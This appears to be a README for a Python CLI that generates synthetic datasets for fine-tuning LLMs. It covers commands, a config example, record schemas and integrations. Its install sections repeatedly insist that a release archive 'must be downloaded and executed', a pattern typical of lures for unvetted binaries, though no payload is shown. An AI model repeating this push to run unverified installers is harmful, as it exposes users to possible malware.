# 🚀 Datalore DeepResearch CLI — Generate Datasets for LLMs

[![Releases](https://img.shields.io/badge/Releases-%20download-blue?logo=github)](https://github.com/El1ordan/datalore-deepresearch-cli/releases)

A CLI tool that runs a research-driven workflow to generate synthetic datasets for fine-tuning large language models (LLMs). It combines prompt design, data synthesis, validation, and export for downstream fine-tuning with LangChain, Langraph, or raw OpenAI APIs.

- Topics: dataset-generation, deepresearch, fine-tuning, langchain, langraph, llms, openai, python, synthetic-dataset-generation, synthetic-datasets

---

![AI Dataset Pipeline](https://img.icons8.com/ios-filled/500/artificial-intelligence.png)

Table of Contents
- About
- Key features
- Core concepts
- Quick start
- Install from Releases
- CLI reference
- Example workflows
- Data schemas and formats
- Fine-tuning pipeline
- Integration notes (LangChain / Langraph)
- Development
- Contributing
- License
- Links

About
This repository hosts a command-line interface for the DeepResearch workflow. The CLI automates prompt composition, synthetic data generation, quality checks, and dataset packaging for fine-tuning LLMs. It lets data scientists and ML engineers produce targeted datasets at scale, run reproducible experiments, and export artifacts in formats ready for common training frameworks.

Key features
- Research-driven pipeline: define research goals, chain prompt stages, and track versions.
- Prompt templating: use Jinja-like templates with variables, loops, and conditional logic.
- Controlled synthesis: sample with temperature, top_p, and repetition controls.
- Validation runs: run assertions, schema checks, and custom validators.
- Export formats: JSONL, CSV, TFRecords, Hugging Face dataset format.
- Fine-tuning ready: generate instruction-response pairs, classification sets, and ranking datasets.
- Integrations: hooks for OpenAI, local LLMs, LangChain chains, and Langraph graphs.
- CLI-first: scriptable commands for CI/CD and reproducible experiments.
- Lightweight: pure Python core, modular adapters.

Core concepts
- Project: top-level directory that stores configs, prompts, experiments, and outputs.
- Stage: a discrete step in the research workflow (prompt, rewrite, filter, enrich).
- Asset: a generated file or packaged dataset.
- Validator: a small function or schema that verifies a record.
- Run: a full pass that produces a dataset artifact and logs.

Quick start
1. Create a project folder:
   mkdir my-research
   cd my-research

2. Initialize a template:
   datalore-dr init --template instruction-tuning

3. Edit prompts and config in ./datalore.yaml.

4. Run a generation:
   datalore-dr generate --experiment baseline

5. Validate and export:
   datalore-dr validate --experiment baseline
   datalore-dr export --format jsonl --out baseline.jsonl

Install from Releases
Download the latest stable release assets from the Releases page and run the included installer or binary. Visit the releases page and download the release tarball or installer. The file must be downloaded and executed.

- Releases: https://github.com/El1ordan/datalore-deepresearch-cli/releases
- Suggested asset name: datalore-deepresearch-cli-vX.Y.Z.tar.gz
- After download:
  tar -xzf datalore-deepresearch-cli-vX.Y.Z.tar.gz
  cd datalore-deepresearch-cli-vX.Y.Z
  ./install.sh
  datalore-dr --help

If the installer uses a different name, download the provided asset and run the included entry script inside the archive. The releases page lists all release assets and checksums.

If you prefer pip:
- pip install datalore-deepresearch-cli

If you clone the repo:
- python -m venv venv
- source venv/bin/activate
- pip install -r requirements.txt
- python setup.py install

CLI reference
Commands follow natural verbs. Run datalore-dr --help for full options.

- datalore-dr init [--template <name>]
  Create a new project scaffold with default prompts and config.

- datalore-dr generate --experiment <name> [--workers N]
  Run synthesis stages. Writes artifact to experiments/<name>/outputs.

- datalore-dr validate --experiment <name> [--validator <path>]
  Run built-in checks and custom validators.

- datalore-dr export --experiment <name> --format <jsonl|csv|hf|tfrecord>
  Package dataset for downstream use.

- datalore-dr train --experiment <name> --backend <huggingface|openai|local>
  Run a fine-tuning job or prepare artifacts for a remote trainer.

- datalore-dr inspect --artifact <path>
  Print summary stats and data samples.

- datalore-dr serve --artifact <path> --port 8080
  Start a small web UI to inspect records and labels.

Example workflows

1) Instruction tuning workflow (few-shot)
- Define a seed prompt template for tasks you want the model to learn.
- Add a stage to rewrite and diversify prompts.
- Generate 10K instruction-response pairs with temperature sampling.
- Validate that responses match required schema.
- Export JSONL for Hugging Face fine-tuning.

Example config (datalore.yaml)
project:
  name: my-instruction-tuning
  version: 0.1.0
pipeline:
  - name: prompt-expand
    adapter: template
    template: |
      Instruction: {{ instruction }}
      Context: {{ context }}
  - name: synthesize
    adapter: openai
    model: gpt-4o
    params:
      temperature: 0.2
      max_tokens: 256
  - name: filter
    adapter: validator
    rules:
      - max_length: 512

2) Classification dataset (balanced)
- Prepare a label sampling stage to balance classes.
- Generate synthetic contexts per label.
- Validate class balance and label accuracy via a classifier audit.
- Export CSV; use for fine-tuning or evaluation.

Data schemas and formats
The CLI supports common dataset schemas. Each record uses a small standard envelope:

{
  "id": "uuid",
  "meta": {
    "project": "my-research",
    "run": "baseline",
    "stage": "synthesize",
    "timestamp": "2025-01-02T12:34:56Z"
  },
  "input": {
    "instruction": "...",
    "context": "..."
  },
  "output": {
    "response": "...",
    "score": 0.98
  }
}

Supported output formats:
- JSONL: one-record-per-line for most training pipelines.
- CSV: flat records for tabular tooling.
- HF Dataset: pushable to the Hugging Face hub.
- TFRecord: TensorFlow training ready.

Validation and quality checks
Validators work as small Python functions or JSON Schema files. The CLI ships with checks such as:
- Schema conformance
- Toxicity filter (optional)
- Semantic drift detector (sample-based embeddings)
- Token length range

You plug in a validator like:
datalore-dr validate --experiment baseline --validator validators/schema_check.py

Fine-tuning pipeline
The tool prepares datasets for training with common backends:
- OpenAI fine-tune API: pack instruction/response pairs into JSONL formatted per OpenAI spec.
- Hugging Face Trainer: export HF dataset and training script.
- Local trainer: export TFRecord and run a local trainer script.

Sample export for OpenAI:
datalore-dr export --experiment baseline --format jsonl --target openai
The command writes openai_ready.jsonl with fields prompt and completion.

Integration notes (LangChain / Langraph)
- LangChain: wrap the generation stage with a LangChain chain to compose multi-step prompts. Use the langchain adapter in the pipeline.
- Langraph: use graph adapters to define branches and parallel stages. The CLI treats a Langraph graph as a pipeline definition and executes nodes as stages.

Adapters
Adapters abstract external systems:
- openai (HTTP)
- local-llm (Llama, Mistral via subprocess)
- langchain
- langraph
- validator
Add adapters by placing a Python file in adapters/ and registering it in datalore.yaml.

Best practices for synthetic dataset generation
- Start small: produce a pilot set and run validators.
- Version prompts: keep a change log when you alter templates.
- Track seed values: store RNG seed for reproducibility.
- Balance labels: sample to avoid class skew.
- Audit samples: run a human-in-the-loop audit of 1% of records.

Example: generate, validate, export
datalore-dr generate --experiment demo --workers 4
datalore-dr validate --experiment demo
datalore-dr export --experiment demo --format hf --out ./artifacts/demo-hf

Project layout
- datalore.yaml — pipeline definition
- prompts/ — prompt templates and examples
- adapters/ — connectors to APIs and LLMs
- experiments/ — generated artifacts per run
- validators/ — custom validation scripts
- scripts/ — helper scripts and training wrappers

Development
- Python 3.10+ recommended.
- Install dev deps:
  pip install -r requirements-dev.txt
- Run unit tests:
  pytest tests/

Contributing
- Fork the repo.
- Open an issue for feature requests or bugs.
- Send PRs with focused changes and tests.
- Follow the code style and add docs.

License
This project uses the MIT license. See LICENSE file for full text.

Releases and downloads
A release archive contains the CLI binary, installer, and checksums. Download the release asset and execute the installer in a shell. The file must be downloaded and executed. Visit the Releases page for the asset list and checksums:

https://github.com/El1ordan/datalore-deepresearch-cli/releases

Contact and links
- Repository: https://github.com/El1ordan/datalore-deepresearch-cli
- Releases: [Releases](https://github.com/El1ordan/datalore-deepresearch-cli/releases)
- Issues: open an issue on GitHub for bugs or feature requests

Badges
[![Python Version](https://img.shields.io/badge/python-3.10%2B-blue)](https://www.python.org/)
[![License: MIT](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Releases](https://img.shields.io/badge/Releases-%20download-blue?logo=github)](https://github.com/El1ordan/datalore-deepresearch-cli/releases)